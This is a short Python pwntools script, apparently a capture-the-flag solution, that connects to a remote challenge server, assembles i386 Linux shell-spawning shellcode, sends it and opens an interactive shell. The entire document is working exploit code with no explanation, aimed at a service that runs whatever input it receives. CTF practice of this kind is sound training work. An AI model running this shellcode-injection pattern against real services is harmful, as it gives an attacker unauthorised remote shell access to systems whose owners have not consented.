from pwn import *


p = remote("node4.buuoj.cn", 27504)

context(os="linux", arch="i386")

code = asm(shellcraft.sh())
p.sendline(code)

p.interactive()

